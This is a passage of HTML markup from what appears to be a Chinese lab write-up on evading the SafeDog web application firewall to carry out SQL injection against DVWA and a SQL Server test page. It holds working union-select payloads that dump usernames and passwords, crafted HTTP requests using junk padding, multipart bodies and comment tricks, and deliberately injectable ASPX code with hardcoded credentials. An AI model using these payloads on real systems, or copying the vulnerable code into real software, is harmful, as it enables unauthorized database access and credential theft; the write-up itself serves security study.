class="line">a=/*AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCCCCCCCCDDDDDBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCSSSSSSSSSSSSSSSSSSSSSSSSSSSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB&amp;id=1&#x27; union select null,concat_ws(char(32,58,32),user,password) from users%23</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/10/15/TGSn9jEO6YJwzKL.png" alt="image-20211015235313081"></p>
-<h3 id="函数分隔符绕过"><a href="#函数分隔符绕过" class="headerlink" title="函数分隔符绕过"></a>函数分隔符绕过</h3><h4 id="绕过原理-1"><a href="#绕过原理-1" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>规则缺陷/特性：函数与括号之间插入分隔符可以正常执行</strong></p>
-<p>对基于正则表达式的WAF，我们猜测安全工程师写WAF规则时，可能不知道函数名与左括号之间可以存在特殊字符，或者遗漏可以存在特殊字符。例如匹配函数”concat()”的规则写法，“concat(”或者”concat\s*(”，就没有考虑到一些特殊字符。相应的绕过方法，在特殊位置引入特殊的分隔符，逐个测试。这些特殊分隔符发现也是通过Fuzz出来的。</p>
-<p><strong>绕过技巧</strong>：</p>
-<ul>
-<li>函数与括号之间可以插入空白符或多行注释达到绕过</li>
-<li>GET型请求转POST型</li>
-</ul>
-<p><strong>数据包构造</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/sqli/?Submit=Submit HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 83</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit</span><br><span class="line">Cookie: security=low; ECS[visit_times]=1; PHPSESSID=90a4331de18bcd32ee2d780254f44589</span><br><span class="line"></span><br><span class="line">id=-1&#x27; union select null,concat_ws(char%0a%0d(32,58,32),user,password) from users #</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/10/16/lhWsHSvDfrwjN2Q.png" alt="image-20211016103625239"></p>
-<h3 id="协议未覆盖绕过"><a href="#协议未覆盖绕过" class="headerlink" title="协议未覆盖绕过"></a>协议未覆盖绕过</h3><h4 id="绕过原理-2"><a href="#绕过原理-2" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>HTTP协议兼容性：HTTP Body多样性</strong></p>
-<p>在 http 头里的 Content-Type 提交表单支持四种协议：</p>
-<ul>
-<li>application/x-www-form-urlencoded  -编码模式</li>
-<li>multipart/form-data  -文件上传模式</li>
-<li>text/plain  -文本模式</li>
-<li>application/json  -json模式</li>
-</ul>
-<p>文件头的属性是传输前对提交的数据进行编码发送到服务器。其中 multipart/form-data 表示该数据被编码为一条消息,页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。</p>
-<p><strong>绕过技巧</strong>：</p>
-<ul>
-<li>使用表单请求中的multipart/form-data</li>
-<li>关键词换行</li>
-<li>GET型请求转POST型</li>
-</ul>
-<p><strong>数据包构造</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/sqli/?Submit=Submit HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Length: 218</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit</span><br><span class="line">Cookie: security=low; ECS[visit_times]=1; PHPSESSID=90a4331de18bcd32ee2d780254f44589</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">id=-1&#x27; union select null,concat_ws</span><br><span class="line"></span><br><span class="line">(char(32,58,32),user,password) </span><br><span class="line"></span><br><span class="line">from users #</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/10/16/iybr6tfZzQsVJnO.png" alt="image-20211016111037975"></p>
-<h3 id="多行注释符替换绕过"><a href="#多行注释符替换绕过" class="headerlink" title="多行注释符替换绕过"></a>多行注释符替换绕过</h3><h4 id="绕过原理-3"><a href="#绕过原理-3" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>规则缺陷/特性：数据库空格可使用其它字符替代</strong></p>
-<p>因为注释符#、— 都是把后面的语句全部注释掉了，而多行注释/**/则是注释指定部分，需要一前一后闭合，所以在传参那里几乎不做注释语句用，而是用于过滤空格等bypass。</p>
-<p>在进行SQL语句查询的时候可以利用注释符来替代语法中的空格，例如：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [dbo].[<span class="keyword">User</span>] <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>可替代为：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>[dbo].[<span class="keyword">User</span>]<span class="comment">/**/</span><span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>那么意味着在注释符中可以添加大量的无效字符来打破WAF的规则匹配。</p>
-<p><strong>绕过技巧</strong>：</p>
-<ul>
-<li>使用多行注释符/**/来构造payload进行绕过</li>
-</ul>
-<p>使用order by语句进行测试</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+order by 2+%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line"># 被拦截</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/10/16/tnBhzJPOFDXUjox.png" alt="image-20211016145100751"></p>
-<p><code>/**/</code>替换空格</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+order/**/by 2+%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line"># 被拦截</span><br></pre></td></tr></table></figure>
-<p><code>/*--*/</code>替换空格</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+order/*--*/by 2+%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line"># 被拦截</span><br></pre></td></tr></table></figure>
-<p><code>/*//*/</code>替换空格</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+order/*//*/by 2+%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line"># 不拦截</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/10/16/ISpgjVWdTlus1xE.png" alt="image-20211016145143507"></p>
-<p>再使用union select语句进行测试</p>
-<p><img src="https://i.loli.net/2021/10/16/ldBFst71nVmaO4j.png" alt="image-20211016150036280"></p>
-<p>得出可以使用<code>/*//*/</code>代替空格来进行绕过获取数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+union/*//*/select 1,concat_ws(char(32,58,32),user,password) from/*//*/users+%23&amp;Submit=Submit#</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/10/16/ZkhTPXifCQYWKIr.png" alt="image-20211016150953965"></p>
-<h2 id="Bypass安全狗SQLServer注入"><a href="#Bypass安全狗SQLServer注入" class="headerlink" title="Bypass安全狗SQLServer注入"></a>Bypass安全狗SQLServer注入</h2><h3 id="SQLServer特性"><a href="#SQLServer特性" class="headerlink" title="SQLServer特性"></a>SQLServer特性</h3><p><strong>空格可以由其它字符替代</strong></p>
-<blockquote>
-<p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,db_name()<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
-</blockquote>
-<ul>
-<li><p>位置①</p>
-<ul>
-<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
-<li>可以利用注释符号：/**/、—+a%0d%0a</li>
-<li>可利用数学运算符以及数据类型：news_id=1.0，news_id=1e0，news_id=1-1</li>
-</ul>
-</li>
-<li><p>位置②</p>
-<ul>
-<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
-<li>可以利用注释符号：/**/、—+a%0d%0a</li>
-<li>可以利用加号+替换空格：union+select</li>
-</ul>
-</li>
-<li><p>位置③</p>
-<ul>
-<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
-<li>可以利用注释符号：/**/、—+a%0d%0a</li>
-<li>可利用数学运算符：+、-、~、.    （注：其中-、~、.号必须是select查询的第一个字段的数据类型为数字型才能使用）</li>
-<li>可以利用小括号()替换空格：select(1),2,db_name()</li>
-</ul>
-</li>
-<li><p>位置④</p>
-<ul>
-<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
-<li>可以利用注释符号：/**/、—+a%0d%0a</li>
-<li>可利用其他字符：%80~%FF（需要IIS服务器支持）</li>
-</ul>
-</li>
-<li><p>位置⑤</p>
-<ul>
-<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
-<li>可以利用注释符号：/**/、—+a%0d%0a</li>
-<li>可利用其他字符：%80~%FF（需要IIS服务器支持）</li>
-<li>可以利用点号.替换空格：from.users</li>
-<li>可以利用中括号[]替换空格：from[users]</li>
-</ul>
-</li>
-</ul>
-<h3 id="实验靶场-1"><a href="#实验靶场-1" class="headerlink" title="实验靶场"></a>实验靶场</h3><p>数据库：SQL Server 2008R2</p>
-<p>Web服务器： IIS7.5 CN</p>
-<p>WAF：网站安全狗（IIS版）v4.0.3215</p>
-<p>靶场源码如下：index.aspx</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Data&quot; %&gt;</span><br><span class="line">&lt;%@ Import namespace=&quot;System.Data.SqlClient&quot;  %&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;script runat=&quot;server&quot;&gt;</span><br><span class="line">    private DataSet resSet=new DataSet();</span><br><span class="line">    protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        String strconn = &quot;server=.;database=test;uid=sa;pwd=admin&quot;;</span><br><span class="line">		string id = Request.Params[&quot;id&quot;];</span><br><span class="line">        string sql = string.Format(&quot;select * from newss where id=&#123;0&#125;&quot;, id);</span><br><span class="line">        SqlConnection connection=new SqlConnection(strconn);</span><br><span class="line">        connection.Open();</span><br><span class="line">        SqlDataAdapter dataAdapter = new SqlDataAdapter(sql, connection);</span><br><span class="line">        dataAdapter.Fill(resSet);</span><br><span class="line">        DgData.DataSource = resSet.Tables[0];</span><br><span class="line">        DgData.DataBind();</span><br><span class="line">        Response.Write(&quot;执行语句:&lt;br&gt;&quot;+sql);</span><br><span class="line">        Response.Write(&quot;&lt;br&gt;结果为:&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head runat=&quot;server&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;</span><br><span class="line">    &lt;title&gt;SQLServer注入测试&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;form1&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;asp:DataGrid ID=&quot;DgData&quot; runat=&quot;server&quot; BackColor=&quot;White&quot; BorderColor=&quot;#3366CC&quot; </span><br><span class="line">            BorderStyle=&quot;None&quot; BorderWidth=&quot;1px&quot; CellPadding=&quot;4&quot; </span><br><span class="line">                HeaderStyle-CssClass=&quot;head&quot; Width=&quot;203px&quot;&gt;</span><br><span class="line">            &lt;FooterStyle BackColor=&quot;#99CCCC&quot; ForeColor=&quot;#003399&quot; /&gt;</span><br><span class="line">            &lt;SelectedItemStyle BackColor=&quot;#009999&quot; Font-Bold=&quot;True&quot; ForeColor=&quot;#CCFF99&quot; /&gt;</span><br><span class="line">            &lt;PagerStyle BackColor=&quot;#99CCCC&quot; ForeColor=&quot;#003399&quot; HorizontalAlign=&quot;Left&quot; </span><br><span class="line">                Mode=&quot;NumericPages&quot; 